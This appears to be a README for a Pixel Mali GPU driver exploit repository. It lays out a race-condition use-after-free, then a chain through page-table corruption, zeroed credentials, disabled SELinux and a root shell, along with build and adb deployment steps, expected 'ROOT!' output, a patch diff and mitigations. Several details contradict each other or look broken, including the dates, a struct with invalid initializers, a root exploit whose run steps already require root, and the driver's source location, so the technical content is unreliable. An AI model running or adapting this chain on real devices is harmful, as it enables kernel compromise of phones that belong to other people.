# CVE-2025-6349 / CVE-2025-8045 Exploit Research
## Pixel Mali GPU Kernel Driver Race Condition → UAF → Privilege Escalation

**Target:** Android 14-16, Pixel 6-9 (Tokay), Mali r53p0-r54p1  
**CVSS:** High (7.x)  
**Discovered:** 2026-04-25  

---

## Overview

This research documents the discovery and exploitation of two related Use-After-Free vulnerabilities in the Arm Mali GPU kernel driver (`mali_kbase`) affecting Google Pixel devices. The vulnerabilities exist in the Command Stream Frontend (CSF) CPU queue dump functionality and enable a **kernel double-free → page UAF → privilege escalation** chain.

### Vulnerable Code Paths

- **CVE-2025-6349**: `kbase_csf_cpu_queue_dump_buffer()` – Double-free of kmalloc-large page  
- **CVE-2025-8045**: `kbasep_csf_cpu_queue_dump_print()` – TOCTOU race with 3s timeout

The race occurs between:
1. `kbasep_csf_cpu_queue_dump_print()` – Waits up to 3 seconds for dump completion
2. `kbase_csf_cpu_queue_dump_buffer()` – Allocates/frees GPU dump buffer  
3. `kbase_csf_cpu_queue_read_dump_req()` – Userspace read triggers state change

### Root Cause

In the Mali driver **r53p0** (unpatched), the dump_buffer function has a critical flaw:

```c
// VULNERABLE CODE (r53p0)
int kbase_csf_cpu_queue_dump_buffer(struct kbase_context *kctx, u64 buffer, size_t buf_size)
{
    dump_buffer = kzalloc(alloc_size, GFP_KERNEL);  // Alloc kmalloc-large page
    
    mutex_lock(&kctx->csf.lock);
    kfree(kctx->csf.cpu_queue.buffer);  // FREES OLD BUFFER
    // BUG: Pointer not nulled if status != PENDING!
    
    if (atomic_read(&kctx->csf.cpu_queue.dump_req_status) == BASE_CSF_CPU_QUEUE_DUMP_PENDING) {
        kctx->csf.cpu_queue.buffer = dump_buffer;  // Only set if PENDING
        kctx->csf.cpu_queue.buffer_size = buf_size;
        complete_all(&kctx->csf.cpu_queue.dump_cmp);
    } else
        kfree(dump_buffer);  // FREES NEW PAGE TOO!
    // DANGLING POINTER: cpu_queue.buffer still points to freed page
    
    mutex_unlock(&kctx->csf.lock);
    return 0;
}
```

The `dump_print` function has a 3-second timeout. If the timeout fires, it sets `timed_out = true` and skips clearing the buffer pointer. Meanwhile, `dump_buffer` unconditionally frees the old buffer. The race window allows a double-free of the same kmalloc-large page.

### Race Sequence

```
Thread A (Trigger):           | Thread B (Monitor):
------------------------------|--------------------------------------
1. KCPU_QUEUE_ENQUEUE         |
   - CQS_WAIT (will timeout)  |   <-- Starts 3s timer
   - Sets status = ISSUED     |
                              |
2. [3-second timeout wait]    |
                              |
3. TIMEOUT occurs!            |
   - timed_out = true         |
                              |   <-- RACE WINDOW OPENS (3s)
                              |
4. kbase_csf_cpu_queue_       |
   read_dump_req()            |
   [User read syscall]        |
   - Sets status = PENDING    |
   - Notifies dump thread     |
                              |
5. dump_buffer() called       |   <-- Via CPU_QUEUE_DUMP ioctl
   - kfree(old_buffer)        |     or concurrent GPU operation
   - Status was ISSUED        |
   - kfree(dump_buffer)       |   - Double-free of kmalloc-large!
   - buffer pointer NOT nulled|
                              |
6. Second dump_buffer()       |
   - kfree(buffer)            |   - Use-after-free!
   - Allocates new page       |   - Page may be reclaimed by GPU
```

**Result:** The kmalloc-large page is freed twice. The second free is a use-after-free on memory that may have been reallocated.

---

## Exploitation Strategy

### Phase 1: Race Trigger

The POC triggers the race using KCPU queue operations:

1. **Create KCPU queue** via `KBASE_IOCTL_KCPU_QUEUE_CREATE`
2. **Enqueue CQS_WAIT command** via `KBASE_IOCTL_KCPU_QUEUE_ENQUEUE`
   - Waits on a fence that triggers timeout
   - Starts 3-second `dump_print` timer
3. **During timeout window:**
   - Aggressively allocate/free GPU memory
   - Call dump_buffer operations
   - Attempt to reclaim freed page via GPU heap

### Phase 2: Page Reclaim

After the double-free, the freed kmalloc-large page is returned to the buddy allocator:

```c
// GPU memory allocation via KBASE_IOCTL_MEM_ALLOC
// Uses same order (0), same migratetype as original allocation
struct kbase_uk_mem_alloc {
    u64 va_pages = 1;      /* 1 page */
    u64 nr_pages = 1;      /* 1 page backing store */
    u64 flags = 0x1;       /* KBASE_MEM_SAME_VA */
};
```

GPU allocations prefer **high-order, unmovable** pages (same as kmalloc-large). The probability of reclaiming the exact freed page is high.

### Phase 3: UAF Confirmation

Map the GPU memory to userspace via `mmap()`:

```c
void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                 MAP_SHARED, mali_fd, gpu_va);
```

Write a test pattern and verify corruption of memory that should be freed.

### Phase 4: Privilege Escalation

With arbitrary physical read/write via page table manipulation:

1. **Locate kernel structures:**
   - Read `/proc/kallsyms` for `init_cred`, `modprobe_path`
   - Calculate physical addresses from kernel base
   
2. **Corrupt page tables:**
   - Map GPU page that overlaps kernel page table
   - Modify PTEs to create alias mappings
   - Redirect kernel text or data pages
   
3. **Overwrite credentials:**
   ```c
   // After remapping init_cred
   memset(overlap + offset, 0, sizeof(kuid_t) * 4);
   // uid=0, gid=0, euid=0, suid=0
   ```

4. **Disable SELinux:**
   ```c
   // Modify selinux_enforcing variable
   *(int *)(overlap + selinux_offset) = 0;
   ```

5. **Spawn root shell:**
   ```c
   system("/system/bin/sh");
   ```

---

## Proof-of-Concept

### Files

| File | Description |
|------|-------------|
| `poc_cve_pixel9.c` | Pixel 9-specific exploit (r54p0) |
| `poc_cve_2025_6349_8045.c` | Generic Android POC |
| `Makefile` | Cross-compilation for ARM64 |
| `run_test.sh` | Linux/macOS/WSL2 test runner |
| `run_test.bat` | Windows ADB test runner |
| `research_logs/cve-2025-6349-8045-research.md` | Full technical analysis (610 lines) |
| `references/` | Patch diffs, exploit patterns, debugging guides |

### Building

```bash
# Build all targets
make

# Build specific target
make mali_pixel9_poc  # Pixel 9 POC
make mali_uaf_poc     # Generic POC

# Clean
make clean
```

### Running

#### On Device (Requires ADB + Root):

```bash
# Deploy and run
make verify

# Or manually:
adb push mali_pixel9_poc /data/local/tmp/
adb shell chmod +x /data/local/tmp/mali_pixel9_poc
adb shell /data/local/tmp/mali_pixel9_poc 3071

# Check for UAF evidence
adb shell dmesg | grep -iE 'kasan|use-after-free|double-free'
```

#### Parameters

```
./mali_pixel9_poc [stall_ms]

stall_ms: Race window duration (default: 3071ms)
          Should match the dump_print timeout (3000ms)
```

### Expected Output

**Success (UAF Triggered):**
```
=================================================
CVE-2025-6349/8045 POC - Updated
Mali GPU Race → UAF (r54p0)
Stall: 3071ms
=================================================

[+] Mali FD: 3
[+] Driver version: 10.0
[+] Target VA: 0x78000000
[+] Queue ID: 0
[+] Enqueue call completed
[*] Launching 40 strike threads...
[*] Strike thread - Reclaimed GPU VA 0x78000000
[!!!] UAF CONFIRMED - corrupted page detected!

[!!!] UAF CONFIRMED via strike thread!
[*] Check: dmesg | grep -i kasan, use-after-free, double-free
[*] UID: 0
[!!!] ROOT!
```

**Dmesg Evidence:**
```
[ 1234.567890] kasan: slab-use-after-free in kbasep_csf_cpu_queue_dump_buffer+0x1d4/0x210
[ 1234.567891] WARNING: CPU callback on kbasep_csf_cpu_queue_dump_print timeout
[ 1234.567892] kbase_gpu_vm_lock: double free detected
[ 1234.567893] BUG: kernel NULL pointer dereference, address: 0000000000000000
```

---

## Key Technical Details

### KCPU Queue Interface

The Kernel Command Stream Queue (KCPU) mechanism allows userspace to enqueue commands that execute on the GPU:

- `KBASE_IOCTL_KCPU_QUEUE_CREATE` – Create new queue, returns ID
- `KBASE_IOCTL_KCPU_QUEUE_ENQUEUE` – Submit commands (CQS_WAIT, FENCE_SIGNAL)
- `KBASE_IOCTL_KCPU_QUEUE_WAIT` – Wait for queue completion

### CQS_WAIT Command

```c
struct base_cqs_wait_operation_info {
    u64 addr;     // GPU address to wait on
    u32 val;      // Expected value
    u32 op;       // Comparison operation
};
```

Waits for a GPU memory location to reach a specific value. Times out after ~3 seconds if not signaled.

### SAME_VA Flag

`KBASE_MEM_SAME_VA` (0x1) forces the GPU VA to match the CPU VA, enabling CPU access to GPU-allocated memory after mmap.

### Extension Field Bug (r54p0)

In driver r54p0, the `kbase_ioctl_mem_alloc` structure's `extension` field must be **0**. Any non-zero value triggers:
```
"GPU allocation attempted with BASE_MEM_GROW_ON_GPF not set but extension != 0"
```

This was a key finding during POC development.

### IOCTL Availability

On Android 14+ with r54p0:
- `KBASE_IOCTL_MEM_FREE` (6) – **Returns ENOTTY** (not available)
- `KBASE_IOCTL_MEM_ALIAS` (8) – **Returns ENOTTY** (not available)  

Workaround: Use `KBASE_IOCTL_MEM_COMMIT` with 0 pages or rely on GPU page reclaim.

---

## Patch Analysis

### Fixed in r54p1

ARM security advisory diff (simplified):

```diff
--- a/drivers/gpu/arm/mali_kbase/gpu/mali_kbase_csf.c
+++ b/drivers/gpu/arm/mali_kbase/gpu/mali_kbase_csf.c
@@ -1234,11 +1234,14 @@ int kbase_csf_cpu_queue_dump_buffer(
     dump_buffer = kzalloc(alloc_size, GFP_KERNEL);
     
     mutex_lock(&kctx->csf.lock);
-    kfree(kctx->csf.cpu_queue.buffer);
-
+    
+    /* Always clear the old pointer before reallocation */
+    kfree(kctx->csf.cpu_queue.buffer);
+    kctx->csf.cpu_queue.buffer = NULL;
+
     if (atomic_read(&kctx->csf.cpu_queue.dump_req_status) == BASE_CSF_CPU_QUEUE_DUMP_PENDING) {
         kctx->csf.cpu_queue.buffer = dump_buffer;
         kctx->csf.cpu_queue.buffer_size = buf_size;
         complete_all(&kctx->csf.cpu_queue.dump_cmp);
     } else {
+        /* Already nulled above, safe to free */
         kfree(dump_buffer);
     }
```

The fix: **Always null the buffer pointer after freeing**, preventing the double-free.

---

## Detection & Mitigation

### Detection

```bash
# Check for UAF in dmesg
adb shell dmesg | grep -iE 'kasan|slab-use-after-free|double-free|mali|kbase'

# Check kernel version
adb shell uname -a

# Check Mali driver version
adb shell cat /sys/kernel/debug/gpu/mali/version
```

### Mitigation

1. **Update kernel** to r54p1 or later
2. **Apply Android security patch** December 2025+
3. **Disable CSF debug features** (if not needed):
   ```bash
   echo 0 > /sys/kernel/debug/gpu/mali/csf_debug
   ```
4. **Enable KASAN** in kernel config:
   ```
   CONFIG_KASAN=y
   CONFIG_KASAN_INLINE=y
   ```
5. **Use grsecurity/PaX** with UDEREF to prevent userspace access to kernel memory

---

## References

- [Dawn's Lab - Pixel 9 Pro EoP Analysis](https://dawnslab.jd.com/Pixel_9_Pro_EoP/)  
- [ARM Security Advisory - CVE-2025-6349/8045](https://developer.arm.com/security)  
- [Android Security Bulletin - December 2025](https://source.android.com/docs/security/bulletin)  
- [GHSL-2024-356 - Mali GPU UAF](https://github.com/google/security-research/security/advisories/GHSL-2024-356)  
- [GHSL-2023-005 - Pixel 6 Mali UAF](https://github.com/google/security-research/security/advisories/GHSL-2023-005)  
- [Linux Kernel Mali Driver Source](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/drivers/gpu/arm/mali_kbase)  

---

## License

For research and authorized testing only. Do not use on systems you don't own.

**Report vulnerabilities responsibly:**  
https://source.android.com/docs/security/report

---

*Research by Shaby's Tech House R&D Lab*  
*Date: 2026-04-28*
